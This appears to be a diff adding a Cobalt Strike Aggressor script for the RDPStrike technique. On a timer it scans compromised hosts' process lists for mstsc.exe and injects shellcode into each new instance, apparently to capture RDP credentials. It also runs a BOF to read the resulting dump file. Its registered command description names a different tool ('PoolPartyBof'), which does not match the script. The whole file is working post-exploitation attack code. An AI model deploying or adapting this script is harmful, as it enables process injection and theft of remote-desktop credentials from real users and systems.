@@ -1,0 +1,59 @@
+beacon_command_register (
+    "PoolPartyBof",
+    "Opens a process (given PID), and injects the shellcode, executes via 5 different Variants.",
+    "Synopsis: PoolPartyBof <pid> <Shellcode File> <variant>"
+);
+
+
+@beacons = @();
+@pids = @();
+
+on heartbeat_5s{
+		foreach $index => $beaconid (@beacons) {
+            bps($beaconid, &handleProcess);
+		}
+}
+
+sub handleProcess{
+	$processList = $2;
+	$index = indexOf($processList, "mstsc.exe", 0) + 9;
+	if($index > 9){
+		$temp = substr($processList,$index,-1);
+		$pid = split("\t",$temp)[2];
+		if ($pid !in @pids) {
+			add(@pids,$pid,0);
+			blog($1,"Injecting into mstsc.exe with PID: $pid");
+			bshinject($1, $pid , "x64" ,script_resource("RdpStrike.x64.bin"));
+		}
+	}
+}
+
+alias rdpstrike_enable {
+       local('$profile');
+       $profile = data_query("metadata")["c2profile"];
+       $allocator = [$profile getString: ".process-inject.allocator"];
+       $transform-x64 = [$profile getString: ".process-inject.transform-x64"];
+       if ($allocator eq "MapViewOfFile") {
+            berror($1, "Allocator ".$allocator." Not Supported");
+       } else {
+            if ($transform-x64 ne "null") {
+                berror($1, "transform-x64 detected: ".$transform-x64." \n");
+            } else {
+                blog($1, "RDPStrike enabled \n");
+                add(@beacons,$1,0);
+            }
+       }
+}
+
+alias rdpstrike_disable {
+       blog($1, "Disabling RDPStrike");
+       remove(@beacons,$1);
+}
+
+alias rdpstrike_dump {
+    $handle = openf(script_resource("ReadFile.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    btask($1, "Reading The Dump File!");
+	beacon_inline_execute($1, $data, "go", "");
+}
